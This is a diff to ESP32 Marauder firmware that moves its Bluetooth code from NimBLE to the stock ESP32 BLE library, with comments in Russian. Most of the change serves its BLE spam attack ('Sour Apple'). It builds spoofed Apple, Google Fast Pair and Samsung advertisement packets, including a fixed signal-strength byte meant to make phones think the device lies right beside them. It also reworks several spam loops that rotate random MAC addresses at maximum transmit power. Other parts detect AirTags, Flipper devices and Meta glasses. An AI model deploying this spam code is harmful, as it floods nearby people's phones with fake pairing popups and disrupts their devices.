@@ -3,6 +3,19 @@
 #include "lang_var.h"
 #include "Marauder.h"
 
+#ifdef HAS_BT
+
+/// Advertising mode
+typedef enum {
+    ADV_TYPE_IND                = 0x00,
+    ADV_TYPE_DIRECT_IND_HIGH    = 0x01,
+    ADV_TYPE_SCAN_IND           = 0x02,
+    ADV_TYPE_NONCONN_IND        = 0x03,
+    ADV_TYPE_DIRECT_IND_LOW     = 0x04,
+} esp_ble_adv_type_t;
+
+#endif
+
 #ifdef HAS_PSRAM
   struct mac_addr* mac_history = nullptr;
 #endif
@@ -59,13 +72,18 @@ extern "C" {
 #ifdef HAS_BT
   //ESP32 Sour Apple by RapierXbox
   //Exploit by ECTO-1A
-  NimBLEAdvertising *pAdvertising;
+  BLEAdvertising *pAdvertising;
 
   //// https://github.com/Spooks4576
-  NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
-    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
+  BLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
+    BLEAdvertisementData AdvData = BLEAdvertisementData();
 
-    uint8_t* AdvData_Raw = nullptr;
+    //if ((Type != FlipperZero) && (Type != Airtag)) {
+    //if (Type != Airtag) {
+    //  AdvData.setFlags(0x06); // Добавляет 0x02, 0x01, 0x06 перед полезной нагрузкой
+    //}
+
+    char* AdvData_Raw = nullptr;
     uint8_t i = 0;
 
     switch (Type) {
@@ -75,8 +93,7 @@ extern "C" {
 
         uint8_t name_len = strlen(Name);
 
-        AdvData_Raw = new uint8_t[7 + name_len];
-
+        AdvData_Raw = new char[7 + name_len];
         AdvData_Raw[i++] = 7 + name_len - 1;
         AdvData_Raw[i++] = 0xFF;
         AdvData_Raw[i++] = 0x06;
@@ -94,7 +111,11 @@ extern "C" {
       }
       case Apple: { // Actions
         if (random(10) > 0) {
-          AdvData_Raw = new uint8_t[11];
+          AdvData_Raw = new char[14];
+
+          AdvData_Raw[i++] = 0x02;  // Flags length
+          AdvData_Raw[i++] = 0x01;  // Flags type
+          AdvData_Raw[i++] = 0x06;  // Flags value
 
           AdvData_Raw[i++] = 0x0A;    // Packet Length
           AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
@@ -116,11 +137,11 @@ extern "C" {
           //AdvData_Raw[i++] =  0x10;  // Type ???
           //esp_fill_random(&AdvData_Raw[i], 3);
 
-          AdvData.addData(AdvData_Raw, 11);
+          AdvData.addData(AdvData_Raw, 14);
           break;
         }
         else { // Devices
-          AdvData_Raw = new uint8_t[21];
+          AdvData_Raw = new char[21];
           AdvData_Raw[i++] = 0x14;
           AdvData_Raw[i++] = 0xFF;
           AdvData_Raw[i++] = 0x4C;
@@ -153,7 +174,7 @@ extern "C" {
       }
       case Samsung: {
 
-        AdvData_Raw = new uint8_t[15];
+        AdvData_Raw = new char[15];
 
         uint8_t model = watch_models[rand() % 25].value;
         
@@ -178,7 +199,10 @@ extern "C" {
         break;
       }
       case Google: {
-        AdvData_Raw = new uint8_t[14];
+        AdvData_Raw = new char[17];
+        AdvData_Raw[i++] = 0x02;  // Flags length
+        AdvData_Raw[i++] = 0x01;  // Flags type
+        AdvData_Raw[i++] = 0x06;  // Flags value
         AdvData_Raw[i++] = 3;
         AdvData_Raw[i++] = 0x03;
         AdvData_Raw[i++] = 0x2C; // Fast Pair ID
@@ -194,9 +218,10 @@ extern "C" {
 
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
-        AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+        //AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+        AdvData_Raw[i++] = 0xEC; // -20 dBm, чтобы телефон считал устройство лежащим вплотную
 
-        AdvData.addData(AdvData_Raw, 14);
+        AdvData.addData(AdvData_Raw, 17);
         
         break;
       }
@@ -208,7 +233,7 @@ extern "C" {
         uint8_t name_len = strlen(Name);
 
         // Allocate space for the full Advertisement Data section based on the hex dump
-        AdvData_Raw = new uint8_t[31];  // Adjusted to the specific length of the data in the dump
+        AdvData_Raw = new char[31];  // Adjusted to the specific length of the data in the dump
 
         // Advertisement Data from the hex dump
         AdvData_Raw[i++] = 0x02;  // Flags length
@@ -253,7 +278,7 @@ extern "C" {
       case Airtag: {
         for (int i = 0; i < airtags->size(); i++) {
           if (airtags->get(i).selected) {
-            AdvData.addData(airtags->get(i).payload.data(), airtags->get(i).payloadSize);
+            AdvData.addData(airtags->get(i).payload, airtags->get(i).payloadSize);
             break;
           }
         }
@@ -265,6 +290,8 @@ extern "C" {
       }
     }
 
+    //ble_gap_adv_set_data((const uint8_t*)AdvData_Raw, i);
+
     delete[] AdvData_Raw;
 
     return AdvData;
@@ -274,9 +301,9 @@ extern "C" {
   //////////////////////////////////////////////////////////////////////
   //// https://github.com/Spooks4576
   //////////////////////////////////////////////////////////////////////
-  class bluetoothScanAllCallback: public NimBLEScanCallbacks {
+  class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
 
-        void onResult(const NimBLEAdvertisedDevice* advertisedDevice) override {
+        void onResult(BLEAdvertisedDevice advertisedDevice) override {
 
           if (wifi_scan_obj->bt_pending_clear)
             return;
@@ -290,8 +317,11 @@ extern "C" {
           if ((wifi_scan_obj->currentScanMode == BT_SCAN_AIRTAG) ||
               (wifi_scan_obj->currentScanMode == BT_SCAN_AIRTAG_MON)) { 
             
-            const std::vector<unsigned char>& payLoad = advertisedDevice->getPayload();
-            size_t len = payLoad.size();
+            //const std::vector<uint8_t> &payLoad = advertisedDevice.getPayload();
+            char* payLoad = (char*)advertisedDevice.getPayload();
+
+            //size_t len = payLoad.size();
+            size_t len = advertisedDevice.getPayloadLength() ;
 
             bool match = false;
             if (len >= 4) {
@@ -310,10 +340,10 @@ extern "C" {
               return;
             }
 
-            int rssi = advertisedDevice->getRSSI();
+            int rssi = advertisedDevice.getRSSI();
 
             if (match) {
-              String mac = advertisedDevice->getAddress().toString().c_str();
+              String mac = advertisedDevice.getAddress().toString().c_str();
               mac.toUpperCase();
 
               for (int i = 0; i < airtags->size(); i++) {
@@ -339,7 +369,7 @@ extern "C" {
               airtag.mac = mac;
               
               airtag.payload = payLoad;
-              airtag.payloadSize = payLoad.size();
+              airtag.payloadSize = len;
                             
               airtag.rssi = rssi;
               airtag.last_seen = millis();
@@ -363,8 +393,8 @@ extern "C" {
             }
           }
           else if (wifi_scan_obj->currentScanMode == BT_SCAN_FLIPPER) {
-            const std::vector<unsigned char>& payLoad = advertisedDevice->getPayload();
-            size_t len = payLoad.size();
+            char* payLoad = (char*)advertisedDevice.getPayload();
+            size_t len = advertisedDevice.getPayloadLength() ;
 
             bool match = false;
             String color = "";
@@ -387,8 +417,8 @@ extern "C" {
             }
 
             if (match) {
-              String mac = advertisedDevice->getAddress().toString().c_str();
-              String name = advertisedDevice->getName().c_str();
+              String mac = advertisedDevice.getAddress().toString().c_str();
+              String name = advertisedDevice.getName().c_str();
               mac.toUpperCase();
 
               for (int i = 0; i < flippers->size(); i++) {
@@ -398,7 +428,7 @@ extern "C" {
                 }
               }
 
-              int rssi = advertisedDevice->getRSSI();
+              int rssi = advertisedDevice.getRSSI();
               Serial.print(rssi);
               Serial.print(F(" "));
               Serial.println(mac);
@@ -426,22 +456,22 @@ extern "C" {
               #ifndef HAS_MINI_SCREEN
                 display_string.concat(text_table4[0]);
               #endif
-              display_string.concat(advertisedDevice->getRSSI());
-              Serial.print(advertisedDevice->getRSSI());
+              display_string.concat(advertisedDevice.getRSSI());
+              Serial.print(advertisedDevice.getRSSI());
       
               display_string.concat(" ");
               Serial.print(F(" "));
               
               Serial.print(F("Device: "));
-              if(advertisedDevice->getName().length() != 0)
+              if(advertisedDevice.getName().length() != 0)
               {
-                display_string.concat(advertisedDevice->getName().c_str());
-                Serial.print(advertisedDevice->getName().c_str());
+                display_string.concat(advertisedDevice.getName().c_str());
+                Serial.print(advertisedDevice.getName().c_str());
               }
               else
               {
-                display_string.concat(advertisedDevice->getAddress().toString().c_str());
-                Serial.print(advertisedDevice->getAddress().toString().c_str());
+                display_string.concat(advertisedDevice.getAddress().toString().c_str());
+                Serial.print(advertisedDevice.getAddress().toString().c_str());
               }
               Serial.println() ;
       
@@ -516,13 +546,13 @@ extern "C" {
               wifi_scan_obj->analyzer_frames_recvd++;
 
             if (wifi_scan_obj->analyzer_frames_recvd > ANALYZER_NAME_REFRESH) {
-              display_string.concat(advertisedDevice->getRSSI());
+              display_string.concat(advertisedDevice.getRSSI());
               display_string.concat(" ");
 
-              if(advertisedDevice->getName().length() != 0)
-                display_string.concat(advertisedDevice->getName().c_str());
+              if(advertisedDevice.getName().length() != 0)
+                display_string.concat(advertisedDevice.getName().c_str());
               else
-                display_string.concat(advertisedDevice->getAddress().toString().c_str());
+                display_string.concat(advertisedDevice.getAddress().toString().c_str());
 
               wifi_scan_obj->analyzer_frames_recvd = 0;
               wifi_scan_obj->analyzer_name_string = display_string;
@@ -530,8 +560,8 @@ extern "C" {
             }
           }
           else if (wifi_scan_obj->currentScanMode == BT_SCAN_FLOCK) {
-            const std::vector<unsigned char>& payLoad = advertisedDevice->getPayload();
-            size_t len = payLoad.size();
+            char *payLoad = (char*)advertisedDevice.getPayload();
+            size_t len = advertisedDevice.getPayloadLength();
 
             bool hasXuntongMfg = false;
             size_t mfgIndex = 0;  // index of 0xFF (AD type)
@@ -547,7 +577,7 @@ extern "C" {
               }
             }
 
-            String name = advertisedDevice->getName().c_str();
+            String name = advertisedDevice.getName().c_str();
 
             // Check for old penguin name
             bool penguin = false;
@@ -631,9 +661,9 @@ extern "C" {
 
             // Final decision on marking as Flock Penguin battery
             if (hasXuntongMfg && (penguin || name.length() == 0)) {
-              String mac = advertisedDevice->getAddress().toString().c_str();
+              String mac = advertisedDevice.getAddress().toString().c_str();
               mac.toUpperCase();
-              int rssi = advertisedDevice->getRSSI();
+              int rssi = advertisedDevice.getRSSI();
 
               Serial.println(rssi);
               Serial.print(F(" "));
@@ -880,17 +910,17 @@ extern "C" {
             if (buf >= 0)
             {
               String display_string = "";
-              if(advertisedDevice->getName().length() != 0)
+              if(advertisedDevice.getName().length() != 0)
               {
-                Serial.print(advertisedDevice->getName().c_str());
+                Serial.print(advertisedDevice.getName().c_str());
                 for(uint8_t i = 0; i < bad_list_length; i++)
                 {
                   #ifdef HAS_SCREEN
-                    if(strcmp(advertisedDevice->getName().c_str(), bad_list[i].c_str()) == 0)
+                    if(strcmp(advertisedDevice.getName().c_str(), bad_list[i].c_str()) == 0)
                     {
                       display_string.concat(text_table4[1]);
                       display_string.concat(" ");
-                      display_string.concat(advertisedDevice->getName().c_str());
+                      display_string.concat(advertisedDevice.getName().c_str());
                       uint8_t temp_len = display_string.length();
                       for (uint8_t i = 0; i < 40 - temp_len; i++)
                       {
@@ -907,23 +937,23 @@ extern "C" {
               }
               else
               {
-                Serial.print(advertisedDevice->getAddress().toString().c_str());
+                Serial.print(advertisedDevice.getAddress().toString().c_str());
               }
-              Serial.println(advertisedDevice->getRSSI());
+              Serial.println(advertisedDevice.getRSSI());
             }
           }
           else if (wifi_scan_obj->currentScanMode == WIFI_SCAN_DETECT_FOLLOW) {
             unsigned char mac_char[6];
-            wifi_scan_obj->copyNimbleMac(advertisedDevice->getAddress(), mac_char);
+            wifi_scan_obj->copyNimbleMac(advertisedDevice.getAddress(), mac_char);
 
-            int frame_check = wifi_scan_obj->update_mac_entry(mac_char, advertisedDevice->getRSSI(), true);
+            int frame_check = wifi_scan_obj->update_mac_entry(mac_char, advertisedDevice.getRSSI(), true);
           }
           else if (wifi_scan_obj->currentScanMode == BT_SCAN_RAYBAN) { // Filters from https://github.com/NullPxl
             bool match = false;
 
             // Check manufacturer ID
-            if ((advertisedDevice->haveManufacturerData()) && (!match)) {
-              std::string m_data = advertisedDevice->getManufacturerData();
+            if ((advertisedDevice.haveManufacturerData()) && (!match)) {
+              std::string m_data = advertisedDevice.getManufacturerData().c_str();
               if (m_data.length() >= 2) {
                 uint16_t companyId = ((uint8_t)m_data[1] << 8) | (uint8_t)m_data[0];
 
@@ -938,9 +968,9 @@ extern "C" {
             }
 
             // Check Service UUID
-            if ((advertisedDevice->haveServiceUUID()) && (!match)) {
-              for(int i = 0; i < advertisedDevice->getServiceUUIDCount(); i++) {
-                BLEUUID serviceUUID = advertisedDevice->getServiceUUID(i);
+            if ((advertisedDevice.haveServiceUUID()) && (!match)) {
+              for(int i = 0; i < advertisedDevice.getServiceUUIDCount(); i++) {
+                BLEUUID serviceUUID = advertisedDevice.getServiceUUID(i);
                 String uuidStr = String(serviceUUID.toString().c_str());
                 uuidStr.toLowerCase();
                 
@@ -959,8 +989,8 @@ extern "C" {
             }
 
             // Check Service Data
-            if ((advertisedDevice->haveServiceData()) && (!match)) {
-              BLEUUID svcDataUUID = advertisedDevice->getServiceDataUUID();
+            if ((advertisedDevice.haveServiceData()) && (!match)) {
+              BLEUUID svcDataUUID = advertisedDevice.getServiceDataUUID();
               String uuidStr = String(svcDataUUID.toString().c_str());
               uuidStr.toLowerCase();
               
@@ -979,25 +1009,25 @@ extern "C" {
             // Check for old MAC
             if (match) {
               unsigned char mac_char[6];
-              wifi_scan_obj->copyNimbleMac(advertisedDevice->getAddress(), mac_char);
+              wifi_scan_obj->copyNimbleMac(advertisedDevice.getAddress(), mac_char);
 
               if (!wifi_scan_obj->seen_mac(mac_char)) {
                 wifi_scan_obj->save_mac(mac_char);
 
                 display_string = "Meta Device: ";
-                display_string.concat((String)advertisedDevice->getRSSI());
+                display_string.concat((String)advertisedDevice.getRSSI());
                 display_string.concat(F(" "));
                 Serial.print(display_string);
                 Serial.print(F(" "));
-                if(advertisedDevice->getName().length() != 0)
+                if(advertisedDevice.getName().length() != 0)
                 {
-                  display_string.concat(advertisedDevice->getName().c_str());
-                  Serial.println(advertisedDevice->getName().c_str());
+                  display_string.concat(advertisedDevice.getName().c_str());
+                  Serial.println(advertisedDevice.getName().c_str());
                 }
                 else
                 {
-                  display_string.concat(advertisedDevice->getAddress().toString().c_str());
-                  Serial.println(advertisedDevice->getAddress().toString().c_str());
+                  display_string.concat(advertisedDevice.getAddress().toString().c_str());
+                  Serial.println(advertisedDevice.getAddress().toString().c_str());
                 }
 
                 #ifdef HAS_SCREEN
@@ -1081,10 +1111,8 @@ void WiFiScan::RunSetup() {
       {0x20, "Green Watch6 Classic 43m"},
     };
     
-    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
-    NimBLEDevice::setScanDuplicateCacheSize(200);
-    NimBLEDevice::init("");
-    pBLEScan = NimBLEDevice::getScan(); //create new scan
+    BLEDevice::init("");
+    pBLEScan = BLEDevice::getScan(); //create new scan
     this->ble_initialized = true;
     
     this->shutdownBLE();
@@ -1696,13 +1724,13 @@ bool WiFiScan::shutdownBLE() {
     if (this->ble_initialized) {
       if (pAdvertising) pAdvertising->stop();
       if (pBLEScan) pBLEScan->stop();
-
       if (pBLEScan) pBLEScan->clearResults();
 
       delay(100);
 
-
-      NimBLEDevice::deinit();
+      BLEDevice::deinit();
+      pBLEScan = NULL ;
+      pAdvertising = NULL ;
 
       this->_analyzer_value = 0;
       this->bt_frames = 0;
@@ -1920,13 +1948,17 @@ bool WiFiScan::mac_cmp(uint8_t addr1[6], uint8_t addr2[6]) {
 }
 
 #ifdef HAS_BT
-  void WiFiScan::copyNimbleMac(const BLEAddress &addr, unsigned char out[6]) {
+  void WiFiScan::copyNimbleMac(const BLEAddress &addr, unsigned char dest[6]) {
       
-      const ble_addr_t* base_addr = addr.getBase();
-      const uint8_t* bytes = base_addr->val;  // NimBLE gives MAC as uint8_t[6]
+      //const ble_addr_t* base_addr = addr.getBase();
+      //const uint8_t* bytes = base_addr->val;  // NimBLE gives MAC as uint8_t[6]
+
+      const uint8_t *native_addr = (const uint8_t*)(const_cast<BLEAddress&>(addr).getNative()) ;
 
       for (int i = 0; i < 6; i++) {
-          out[i] = bytes[i];
+        // getNative() returns address in big endian format
+        // Marauder requires litte endian. So we change byte order.
+          dest[i] = native_addr[5 - i];
       }
   }
 #endif
@@ -3764,7 +3796,7 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
   initTime = millis();
 }
 
-void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type) {
   #ifdef HAS_BT
     uint32_t now_time = millis();
     uint8_t macAddr[6];
@@ -3772,21 +3804,23 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
 
     if (type == Apple2) {
       this->setBaseMacAddress(macAddr);
-      NimBLEDevice::init("");
-      NimBLEServer *pServer = NimBLEDevice::createServer();
+      BLEDevice::init("");
+      BLEServer *pServer = BLEDevice::createServer();
 
       pAdvertising = pServer->getAdvertising();
 
       delay(10);
 
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+      BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
       pAdvertising->setAdvertisementData(advertisementData);
 
-      pAdvertising->setConnectableMode((random(2) == 0) ? BLE_GAP_CONN_MODE_NON : BLE_GAP_CONN_MODE_UND);
-      pAdvertising->setDiscoverableMode(random(3));
+      pAdvertising->setAdvertisementType((random(2) == 0) ? ADV_TYPE_NONCONN_IND : ADV_TYPE_IND);
+      uint8_t discMode = random(3); // 0, 1 или 2
+      advertisementData.setFlags(ESP_BLE_ADV_FLAG_BREDR_NOT_SPT | discMode);
       pAdvertising->setMinInterval(0x20);
       pAdvertising->setMaxInterval(0x20);
-      pAdvertising->setPreferredParams(0x20, 0x20);
+      pAdvertising->setMinPreferred(0x20);
+      pAdvertising->setMaxPreferred(0x20);
 
       pAdvertising->start();
       delay(500);
@@ -3794,20 +3828,20 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
 
       delay(10);
 
-      NimBLEDevice::deinit();
+      BLEDevice::deinit();
     }
     else if (type == Apple) {
       if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
         this->setBaseMacAddress(macAddr);
 
-        NimBLEDevice::init("");
-        NimBLEServer *pServer = NimBLEDevice::createServer();
+        BLEDevice::init("");
+        BLEServer *pServer = BLEDevice::createServer();
 
         pAdvertising = pServer->getAdvertising();
 
         delay(40);
 
-        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+        BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
         pAdvertising->setAdvertisementData(advertisementData);
 
         this->ble_initialized = true;
@@ -3819,7 +3853,7 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
 
       if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
         this->last_sour_apple_update = now_time;
-        NimBLEDevice::deinit();
+        BLEDevice::deinit();
         this->ble_initialized = false;
       }
     }
@@ -3834,21 +3868,21 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
           
           this->setBaseMacAddress(macAddr);
 
-          NimBLEDevice::init("");
+          BLEDevice::init("");
 
-          NimBLEServer *pServer = NimBLEDevice::createServer();
+          BLEServer *pServer = BLEDevice::createServer();
 
           pAdvertising = pServer->getAdvertising();
 
           //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
-          NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
+          BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
           pAdvertising->setAdvertisementData(advertisementData);
           pAdvertising->start();
           delay(10);
           pAdvertising->stop();
 
           //#ifndef HAS_DUAL_BAND
-            NimBLEDevice::deinit();
+            BLEDevice::deinit();
           //#endif
 
           break;
@@ -3861,22 +3895,268 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
              (type == FlipperZero)) {
       this->setBaseMacAddress(macAddr);
 
-      NimBLEDevice::init("");
+      BLEDevice::init("");
 
-      NimBLEServer *pServer = NimBLEDevice::createServer();
+      BLEServer *pServer = BLEDevice::createServer();
 
       pAdvertising = pServer->getAdvertising();
 
-      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
+      BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
       pAdvertising->setAdvertisementData(advertisementData);
       pAdvertising->start();
-      delay(10);
+      delay(100);
       pAdvertising->stop();
 
-      NimBLEDevice::deinit();
+      BLEDevice::deinit();
     }
   #endif
+}*/
+
+
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+  #ifdef HAS_BT
+    uint32_t now_time = millis();
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    // Устанавливаем бит локально администрируемого/случайного адреса (требование спецификации BLE)
+    macAddr[0] |= 0xC0; 
+
+    this->setBaseMacAddress(macAddr);
+
+    // Инициализируем стек ОДИН раз, если он ещё не запущен
+    if (!this->ble_initialized) {
+      BLEDevice::init("");
+      BLEServer *pServer = BLEDevice::createServer();
+      pAdvertising = pServer->getAdvertising();
+      this->ble_initialized = true;
+    }
+
+    BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(
+        (type == Apple2) ? Apple : type
+    );
+
+    if (type == Apple2) {
+      uint8_t discMode = random(3); // 0, 1 или 2
+      // Сначала модифицируем advertisementData, и ТОЛЬКО ПОТОМ передаем в pAdvertising
+      advertisementData.setFlags(0x04 | discMode); 
+      pAdvertising->setAdvertisementType((random(2) == 0) ? ADV_TYPE_NONCONN_IND : ADV_TYPE_IND);
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMaxInterval(0x20);
+    } else {
+      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+    }
+
+    // Отключаем Scan Response, чтобы все байты уходили в основном рекламном пакете
+    pAdvertising->setScanResponse(false);
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    pAdvertising->start();
+    // Даем контроллеру ESP32-C5 достаточно времени (минимум 60-100 мс) на реальную отправку в эфир
+    delay(100);
+    // Останавливаем текущую рассылку перед сменой пакета и MAC
+    pAdvertising->stop();
+    BLEDevice::deinit();
+    this->ble_initialized = false;
+  #endif
+}*/
+
+
+// BLE Advertising Test
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+  #ifdef HAS_BT
+    if (!this->ble_initialized) {
+      // 1. Освобождаем общий радиотракт от Wi-Fi перед запуском BLE
+      esp_wifi_set_promiscuous(false);
+      WiFi.mode(WIFI_OFF);
+      delay(50);
+
+      // 2. Запускаем тестовый маяк
+      BLEDevice::init("ESP32C5_TEST");
+      pAdvertising = BLEDevice::getAdvertising();
+      
+      BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+      oAdvertisementData.setFlags(0x06);
+      oAdvertisementData.setCompleteServices(BLEUUID((uint16_t)0xFE2C));
+      
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+      pAdvertising->start();
+      this->ble_initialized = true;
+    }
+    delay(100);
+  #endif
+}*/
+
+// Working!
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type)
+{
+  if (!this->ble_initialized) { 
+    // 1. Кратковременно поднимаем Wi-Fi на 2.4 ГГц для калибровки PHY и переключения RF-свитча антенны
+    WiFi.mode(WIFI_STA);
+    delay(100);
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+
+    // 2. Инициализируем BLE по полной цепочке init -> createServer -> getAdvertising
+    BLEDevice::init("ESP32C5_TEST");
+    BLEDevice::setPower(ESP_PWR_LVL_P9); // Максимальная мощность TX
+  
+    BLEServer *pServer = BLEDevice::createServer();
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    pAdvertising->addServiceUUID("0000fe2c-0000-1000-8000-00805f9b34fb");
+    pAdvertising->setScanResponse(true);
+    pAdvertising->setMinPreferred(0x06);
+  
+    BLEDevice::startAdvertising();
+    this->ble_initialized = true ;
+  }
+}*/
+
+
+#include <host/ble_hs.h>
+
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+  #ifdef HAS_BT
+
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    macAddr[0] |= 0xC0;
+
+    this->setBaseMacAddress(macAddr);
+
+    // 1. Однократная инициализация радиотракта и стека BLE
+    //if (!this->ble_initialized) {
+      WiFi.mode(WIFI_STA);
+      delay(100);
+      WiFi.mode(WIFI_OFF);
+      delay(50);
+
+      BLEDevice::init("ESP32");
+      BLEDevice::setPower(ESP_PWR_LVL_P9);
+
+      BLEServer *pServer = BLEDevice::createServer();
+      pAdvertising = BLEDevice::getAdvertising();
+      pAdvertising->setScanResponse(false); // Для спама всё должно лежать в основном пакете
+      pAdvertising->setMinPreferred(0x06);
+      //this->ble_initialized = true;
+      delay(50);
+    //}
+
+    // 2. Формируем пакет нужного типа (Apple, Google, Samsung, Microsoft и т.д.)
+    EBLEPayloadType currentType = (type == Apple2) ? Apple : type;
+    BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(currentType);
+
+    // Получаем сырые байты сформированного пакета
+    //std::string payload = advertisementData.getPayload().c_str();
+
+    // 3. Обновляем данные пакета на лету напрямую через NimBLE API (без stop/start обёртки)
+    //if (payload.length() > 0 && payload.length() <= 31) {
+      //Serial.printf("ble_gap_adv_set_data\n") ;
+      //ble_gap_adv_set_data((const uint8_t*)payload.data(), payload.length());
+    //}
+
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    pAdvertising->start() ;
+    // Даем контроллеру 80-100 мс на отправку нескольких пакетов в эфир
+    delay(800);
+    pAdvertising->stop() ;
+    BLEDevice::deinit() ;
+  #endif
+}*/
+
+
+#include <host/ble_hs.h>
+
+void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+  #ifdef HAS_BT
+    static bool rf_calibrated = false;
+
+    // 1. Однократная калибровка PHY и запуск стека BLE
+    if (!this->ble_initialized) {
+      if (!rf_calibrated) {
+        WiFi.mode(WIFI_STA);
+        delay(100);
+        WiFi.mode(WIFI_OFF);
+        delay(50);
+        rf_calibrated = true;
+      }
+
+      BLEDevice::init("");
+      BLEDevice::setPower(ESP_PWR_LVL_P9);
+
+      BLEServer *pServer = BLEDevice::createServer();
+      pAdvertising = BLEDevice::getAdvertising();
+      pAdvertising->setScanResponse(false);
+      //pAdvertising->setMinPreferred(0x06);
+      pAdvertising->setMinInterval(0x20);
+      pAdvertising->setMaxInterval(0x40);
+
+      this->ble_initialized = true;
+    }
+
+    // 2. Генерируем и устанавливаем Random Static MAC на лету
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    macAddr[0] |= 0xC0; // Обязательный префикс для Random Static Address в BLE
+
+    ble_hs_id_set_rnd(macAddr);
+    BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM); // Переключаем обёртку на Random MAC
+
+    // 3. Формируем и отправляем пакет
+    EBLEPayloadType currentType = (type == Apple2) ? Apple : type;
+    BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(currentType);
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    pAdvertising->start();
+    delay(500);
+    pAdvertising->stop();
+  #endif
 }
+
+
+/*void WiFiScan::executeBLESpam(EBLEPayloadType type) {
+  #ifdef HAS_BT
+    static bool rf_calibrated = false;
+
+    // 1. Калибруем радиотракт 2.4 ГГц ОДИН раз за сессию работы устройства
+    if (!rf_calibrated) {
+      WiFi.mode(WIFI_STA);
+      delay(100);
+      WiFi.mode(WIFI_OFF);
+      delay(50);
+      rf_calibrated = true;
+    }
+
+    // 2. Генерируем новый валидный Public MAC ДО инициализации BLE
+    uint8_t macAddr[6];
+    generateRandomMac(macAddr);
+    macAddr[0] &= 0xFE; // Сбрасываем младший бит (требование для Public MAC)
+    this->setBaseMacAddress(macAddr);
+
+    // 3. Инициализируем стек с пустым именем, чтобы не засорять пакет
+    BLEDevice::init("");
+    BLEDevice::setPower(ESP_PWR_LVL_P9);
+
+    BLEServer *pServer = BLEDevice::createServer();
+    pAdvertising = BLEDevice::getAdvertising();
+    pAdvertising->setScanResponse(false);
+    pAdvertising->setMinPreferred(0x06); // Критическая строка для ESP32-C5
+
+    // 4. Формируем данные спама
+    EBLEPayloadType currentType = (type == Apple2) ? Apple : type;
+    BLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(currentType);
+
+    pAdvertising->setAdvertisementData(advertisementData);
+
+    // 5. Отправляем в эфир и чисто освобождаем стек
+    pAdvertising->start();
+    delay(1500);
+    pAdvertising->stop();
+    BLEDevice::deinit();
+  #endif
+}*/
+
 
 /*void WiFiScan::executeAppleJuice() { // Slower version of Sour Apple, pop up device easier
   #ifdef HAS_BT
@@ -3950,15 +4230,15 @@ void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
     esp_err_t err = esp_base_mac_addr_set(macAddr);
 
     // Check for success or handle errors
-    //if (err == ESP_OK) {
-    //  return;
-    //} 
-    //else if (err == ESP_ERR_INVALID_ARG) {
-    //  Serial.println(F("Error: Invalid MAC address argument."));
-    //} 
-    //else {
-    //  Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
-    //}
+    if (err == ESP_OK) {
+      return;
+    } 
+    else if (err == ESP_ERR_INVALID_ARG) {
+      Serial.println(F("Error: Invalid MAC address argument."));
+    } 
+    else {
+      Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
+    }
   //#endif
 }
 
@@ -4536,8 +4816,8 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color) {
 
 void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
   #ifdef HAS_BT
-    NimBLEDevice::init("");
-    NimBLEServer *pServer = NimBLEDevice::createServer();
+    BLEDevice::init("");
+    BLEServer *pServer = BLEDevice::createServer();
 
